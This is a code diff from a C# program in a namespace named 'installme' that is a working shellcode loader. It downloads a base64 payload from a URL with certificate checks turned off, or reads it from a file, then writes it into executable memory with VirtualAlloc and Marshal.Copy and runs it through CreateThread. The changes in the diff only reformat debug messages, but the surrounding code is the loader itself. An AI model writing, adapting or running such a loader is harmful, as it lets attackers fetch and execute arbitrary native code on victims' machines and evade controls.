@@ -54,28 +54,36 @@ namespace installme
                 GroupCollection group = m[0].Groups;
                 WebClient wc = new WebClient();
                 ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
+                if (debug)
+                    Console.WriteLine("[*] Reading payload from URL");
                 b64_payload = wc.DownloadString(group["url"].Value);
             }
             else
             {
-                if (debug) Console.WriteLine("[*] Reading payload from file");
+                if (debug)
+                    Console.WriteLine("[*] Reading payload from file");
                 b64_payload = System.IO.File.ReadAllText(filename);
             }
             byte[] payload = Convert.FromBase64String(b64_payload);
-            if (debug) Console.WriteLine("[*] Payload length = {0}", payload.Length);
+            if (debug)
+                Console.WriteLine("[*] Shellcode payload length = {0}", payload.Length);
 
-            if (debug) Console.WriteLine("[*] Allocating memory");
+            if (debug)
+                Console.WriteLine("[*] VirtualAlloc()");
+
             UInt32 funcAddr = VirtualAlloc(0, (UInt32)payload.Length,
-                                MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-            if (debug) Console.WriteLine("[*] Copying payload into memory");
+                                    MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+            if (debug)
+                Console.WriteLine("[*] Marshal.Copy()");
+
             Marshal.Copy(payload, 0, (IntPtr)(funcAddr), payload.Length);
+                
+            if (debug)
+               Console.WriteLine("[*] CreateThread()");
+
             IntPtr hThread = IntPtr.Zero;
             UInt32 threadId = 0;
-            // prepare data
             IntPtr pinfo = IntPtr.Zero;
-
-            // execute native code
-            if (debug) Console.WriteLine("[*] Creating Thread");
             hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
             WaitForSingleObject(hThread, 0xFFFFFFFF);
         }
